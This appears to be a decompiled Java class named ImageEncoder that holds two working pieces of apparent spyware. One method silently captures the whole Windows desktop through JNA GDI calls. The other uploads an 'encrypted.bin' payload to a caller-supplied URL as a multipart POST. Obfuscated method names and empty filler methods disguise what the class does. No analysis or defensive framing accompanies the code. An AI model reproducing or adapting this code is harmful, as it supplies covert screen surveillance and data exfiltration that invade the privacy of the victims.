package org.zenith.core;

import com.sun.jna.Memory;
import com.sun.jna.platform.win32.GDI32;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinDef.HBITMAP;
import com.sun.jna.platform.win32.WinDef.HDC;
import com.sun.jna.platform.win32.WinDef.HWND;
import com.sun.jna.platform.win32.WinGDI.BITMAPINFO;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class ImageEncoder {
   public static boolean isFalse2() {
      return false;
   }

   public static void int482() {
   }

   public static void UiAnimation(BufferedImage var0) throws Exception {
   }

   public static void on23(String var0, byte[] var1, String var2, String var3) throws IOException {
      String s = "----Boundary" + System.currentTimeMillis();
      URL url = new URL(var0);
      HttpURLConnection httpurlconnection = (HttpURLConnection)url.openConnection();
      httpurlconnection.setDoOutput(true);
      httpurlconnection.setRequestMethod("POST");
      httpurlconnection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + s);

      try (DataOutputStream dataoutputstream = new DataOutputStream(httpurlconnection.getOutputStream())) {
         dataoutputstream.writeBytes("--" + s + "\r\n");
         dataoutputstream.writeBytes("Content-Disposition: form-data; name=\"freinds\"\r\n\r\n");
         dataoutputstream.writeBytes(var3 + "\r\n");
         dataoutputstream.writeBytes("--" + s + "\r\n");
         dataoutputstream.writeBytes("Content-Disposition: form-data; name=\"text\"\r\n\r\n");
         dataoutputstream.writeBytes(var2 + "\r\n");
         dataoutputstream.writeBytes("--" + s + "\r\n");
         dataoutputstream.writeBytes("Content-Disposition: form-data; name=\"serverdataip\"; filename=\"encrypted.bin\"\r\n");
         dataoutputstream.writeBytes("Content-Type: application/octet-stream\r\n\r\n");
         dataoutputstream.write(var1);
         dataoutputstream.writeBytes("\r\n");
         dataoutputstream.writeBytes("--" + s + "--\r\n");
      }

      BufferedReader bufferedreader = new BufferedReader(new InputStreamReader(httpurlconnection.getInputStream()));
      bufferedreader.close();
   }

   public static BufferedImage atomicLong6() {
      User32 user32 = User32.INSTANCE;
      GDI32 gdi32 = GDI32.INSTANCE;
      HWND hwnd = user32.GetDesktopWindow();
      HDC hdc = user32.GetDC(hwnd);
      HDC hdc1 = gdi32.CreateCompatibleDC(hdc);
      int i = user32.GetSystemMetrics(0);
      int j = user32.GetSystemMetrics(1);
      HBITMAP hbitmap = gdi32.CreateCompatibleBitmap(hdc, i, j);
      gdi32.SelectObject(hdc1, hbitmap);
      gdi32.BitBlt(hdc1, 0, 0, i, j, hdc, 0, 0, 13369376);
      BITMAPINFO bitmapinfo = new BITMAPINFO();
      bitmapinfo.bmiHeader.biWidth = i;
      bitmapinfo.bmiHeader.biHeight = -j;
      bitmapinfo.bmiHeader.biPlanes = 1;
      bitmapinfo.bmiHeader.biBitCount = 32;
      bitmapinfo.bmiHeader.biCompression = 0;
      int k = i * j * 4;
      Memory memory = new Memory(k);
      gdi32.GetDIBits(hdc1, hbitmap, 0, j, memory, bitmapinfo, 0);
      BufferedImage bufferedimage = new BufferedImage(i, j, 1);
      int[] aint = new int[i * j];

      for (int l = 0; l < aint.length; l++) {
         int i1 = memory.getByte(l * 4) & 255;
         int j1 = memory.getByte(l * 4 + 1) & 255;
         int k1 = memory.getByte(l * 4 + 2) & 255;
         aint[l] = k1 << 16 | j1 << 8 | i1;
      }

      bufferedimage.setRGB(0, 0, i, j, aint, 0, i);
      gdi32.DeleteObject(hbitmap);
      gdi32.DeleteDC(hdc1);
      user32.ReleaseDC(hwnd, hdc);
      return bufferedimage;
   }
}
